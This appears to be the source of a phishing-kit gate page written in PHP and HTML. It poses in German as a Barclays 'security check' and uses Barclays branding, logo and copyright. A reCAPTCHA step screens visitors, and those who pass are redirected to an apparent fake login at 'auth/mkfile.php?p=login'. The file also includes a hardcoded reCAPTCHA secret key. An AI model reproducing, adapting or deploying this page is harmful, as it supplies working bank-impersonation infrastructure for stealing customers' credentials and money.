<?php
require 'main.php'; // Inclusion obligatoire

// Google reCAPTCHA Prüfung
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $secretKey = '6LddQKsrAAAAAKVXPlqSi5cgWBV2LFcS0c9Mv5Rx';
    $recaptchaResponse = $_POST['g-recaptcha-response'];

    if (!empty($recaptchaResponse)) {
        $verifyUrl = 'https://www.google.com/recaptcha/api/siteverify';
        $response = file_get_contents($verifyUrl . '?secret=' . $secretKey . '&response=' . $recaptchaResponse);
        $responseKeys = json_decode($response, true);

        if ($responseKeys['success']) {
            // ✅ reCAPTCHA verified: Redirect to auth/mkfile.php?p=login
            header("Location: auth/mkfile.php?p=login");
            exit();
        } else {
            $errorMessage = "reCAPTCHA-Überprüfung fehlgeschlagen. Bitte erneut versuchen.";
        }
    } else {
        $errorMessage = "Bitte bestätigen Sie das reCAPTCHA.";
    }
}
?>

<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <title>Sicherheitsüberprüfung – Barclays</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Fonts & CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>

    <style>
        body {
            background-color: #f4f6f9;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 0 25px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 450px;
            width: 100%;
            position: relative;
        }

        .barclays-logo {
            display: block;
            margin: 0 auto 30px auto;
            width: 120px;
        }

        .btn-barclays {
            background-color: #003b71;
            color: #fff;
            border: none;
            width: 100%;
            padding: 12px;
            font-weight: bold;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }

        .btn-barclays:hover {
            background-color: #002952;
        }

        .recaptcha-container {
            margin: 25px 0;
            display: flex;
            justify-content: center;
        }

        .error-message {
            color: #d9534f;
            text-align: center;
            margin-top: 10px;
        }

        h4 {
            color: #003b71;
            text-align: center;
            margin-bottom: 10px;
            font-weight: 700;
        }

        p.description {
            text-align: center;
            color: #444;
            font-size: 15px;
        }

        .footer-info {
            font-size: 12px;
            color: #777;
            text-align: center;
            margin-top: 20px;
        }

        .footer-info small {
            display: block;
        }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.openbanking.org.uk/wp-content/uploads/barclays-375x145.png" alt="Barclays Logo" class="barclays-logo">

        <h4>Sicherheitsüberprüfung</h4>
        <p class="description">Bitte bestätigen Sie, dass Sie kein Roboter sind, um fortzufahren.</p>

        <form method="POST">
            <div class="recaptcha-container">
                <div class="g-recaptcha" data-sitekey="6LddQKsrAAAAAPLReVm1ClLLYufayqnoeXRr8SOq"></div>
            </div>

            <button type="submit" class="btn btn-barclays">Weiter</button>

            <?php if (isset($errorMessage)): ?>
                <p class="error-message"><?php echo $errorMessage; ?></p>
            <?php endif; ?>
        </form>

        <div class="footer-info mt-4">
            <small>Diese Überprüfung dient Ihrer Sicherheit.</small>
            <small>Barclays PLC © <?php echo date("Y"); ?> – Alle Rechte vorbehalten.</small>
        </div>
    </div>
</body>
</html>
